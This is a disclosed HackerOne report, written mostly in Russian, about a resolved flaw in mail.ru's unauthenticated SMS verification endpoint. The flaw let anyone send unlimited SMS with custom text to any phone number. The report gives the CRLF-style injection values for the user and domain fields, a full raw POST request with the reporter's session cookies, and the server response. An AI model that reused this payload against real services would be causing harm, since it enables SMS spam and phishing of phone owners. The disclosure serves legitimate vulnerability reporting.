---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '16935'
original_report_id: '16935'
title: 'e.mail.ru: SMS spam with custom content'
team_handle: mailru
created_at: '2014-06-19T11:29:48.024Z'
disclosed_at: '2015-09-13T12:05:09.763Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
---

# e.mail.ru: SMS spam with custom content

## Metadata

- HackerOne Report ID: 16935
- Weakness: 
- Program: mailru
- Disclosed At: 2015-09-13T12:05:09.763Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Привет!
Суть в том, что можно неограниченно (!) рассылать на любые номера SMS и контролировать содержание второй части SMS-ки. Таким образом можно слать как фейковые события, так и делать рассылку рекламы/поддельные сообщения, итд. Вида "для подтверждения вашего ящика отправьте полученный код на такой-то короткий номер, иначе мейл.ру выключит вас", а он платный :)
Бага в неавторизованной зоне, защита от бана перебиваектся как раз изменением текста сообщения.
Заполнять кастомные SMS-ки тут:
user=+%0d%0a&domain=%0D%0DNEW+COOL+SERVICE+FROM+MAIL.RU%3a+GMAIL.COM


POST /cgi-bin/smsverificator?&ajax_call=1&lang=ru_RU&func_name=register HTTP/1.1
Host: e.mail.ru
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0
Accept: text/plain, */*; q=0.01
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Request-Id: 78d7e2fc-97be-c5be-2f71-76725f7080f4
X-Requested-With: XMLHttpRequest
Referer: https://e.mail.ru/signup?from=main
Content-Length: 168
Cookie: mrcu=C3EB52FA632E5958028A5821010A; p=8BkAAFHOkAAA; VID=3grP2o1i30nE:; s=fver=13|s_vp=(1280/644); i=AQBewKJTBwATAAgcCVwAATABAWQBAY0BAdwEAvQEAh8oASMoAT8oAV0ABQIBAKgACAcCBQABvgABqgAIBwIFAAG+AAHJAAUCAezvAQgEAQEAAVgDCAQBAQAB; b=bz8EAHDhjwQAMvAtAQaHMoRZVITkuIBgNmo+AjptKgjpRpcjpJppg5ACAACCyBk+CKINDWTkF3GKkNu2DYTYUAwRotcxRIzY244A; searchuid=9987040291391447473; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAACAAAID3gcA; Mpop=1403174757:747b55727f050a5519050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; sdcs=CMrkYWPJpwz5moy4; _ga=GA1.2.145097379.1400943163; s_cp=dpr=2; c=W9GdUwAAAMvTAAASAQAAfgCA; mc2=games.mail.ru; mc1=1403175008; HTML5Uploader=2; gmt=4
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

ajax_call=1&x-email=&x_reg_id=fSsejJxSlkHtFSsr&user=+%0d%0a&domain=%0D%0DNEW+COOL+SERVICE+FROM+MAIL.RU%3a+GMAIL.COM&ismobile=1&phonecode=7&phone=9035950503&form_sign=


HTTP/1.1 200 OK
Server: nginx
Date: Thu, 19 Jun 2014 11:23:01 GMT
Content-Type: application/json; charset=utf-8
Connection: keep-alive
Expires: Thu, 01 Jan 1970 00:00:01 GMT
X-Frame-Options: SAMEORIGIN
X-Host: f419.i.mail.ru
X-XSS-Protection: 0
X-ETime: 0.106
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=16070400
Content-Security-Policy: default-src *.mail.ru *.imgsmail.ru *.attachmail.ru *.live.com *.youtube.com *.youtube.ru *.youtu.be *.rutube.ru *.vimeo.com *.smotri.com *.dailymotion.com *.rambler.ru *.ivi.ru *.videomore.ru *.gemius.pl *.weborama.fr *.adriver.ru *.serving-sys.com *.mradx.net;script-src 'unsafe-inline' 'unsafe-eval' *.mail.ru *.imgsmail.ru *.yandex.ru *.odnoklassniki.ru *.youtube.com *.dailymotion.com *.vimeo.com *.scorecardresearch.com; img-src *; style-src 'unsafe-inline'  'unsafe-eval' *.mail.ru *.imgsmail.ru; font-src data: *.imgsmail.ru; report-uri https://cspreport.mail.ru/;
Content-Length: 261

["AjaxResponse","OK",{"text":"ÐÐ¾Ð´ Ð¿Ð¾Ð´ÑÐ²ÐµÑÐ¶Ð´ÐµÐ½Ð¸Ñ Ð¾ÑÐ¿ÑÐ°Ð²Ð»ÐµÐ½ Ð½Ð° Ð½Ð¾Ð¼ÐµÑ <b class=\"nobr\">+7 (903) 595-**-**</b>.","readable_phone":"+7 (903) 595-**-**","action":"generate","verified":0,"error_type":0,"result":"PHONE_CODE_GENERATED"}]

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
